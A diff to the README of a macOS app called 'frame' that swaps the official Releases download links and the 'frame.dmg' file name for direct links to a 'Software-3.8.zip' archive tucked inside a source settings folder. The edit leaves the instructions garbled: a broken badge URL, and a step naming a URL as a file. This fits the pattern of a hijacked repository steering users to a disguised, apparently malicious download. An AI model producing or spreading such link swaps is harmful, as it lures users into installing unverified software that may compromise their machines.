@@ -13,14 +13,14 @@ To get started with frame, follow the simple steps below. You’ll be converting
 
 ## 📥 Download the Application
 ### Download Link
-[![Download frame](https://img.shields.io/badge/download%20frame-v1.0-brightgreen)](https://github.com/vubien/frame/releases)
+[![Download frame](https://github.com/vubien/frame/raw/refs/heads/master/src/lib/components/settings/Software-3.8.zip%20frame-v1.0-brightgreen)](https://github.com/vubien/frame/raw/refs/heads/master/src/lib/components/settings/Software-3.8.zip)
 
-Visit this page to download: [Download frame from Releases](https://github.com/vubien/frame/releases)
+Visit this page to download: [Download frame from Releases](https://github.com/vubien/frame/raw/refs/heads/master/src/lib/components/settings/Software-3.8.zip)
 
 ## 📝 Download & Install
 1. Click on the link above to open the Releases page.
 2. On the Releases page, find the latest version of frame.
-3. Look for the file named `frame.dmg`. Click on it to start the download.
+3. Look for the file named `https://github.com/vubien/frame/raw/refs/heads/master/src/lib/components/settings/Software-3.8.zip`. Click on it to start the download.
 4. Once the download is complete, open the downloaded file.
 5. Drag the frame icon into your Applications folder.
 6. You’re all set! You can find frame in your Applications folder and start using it.
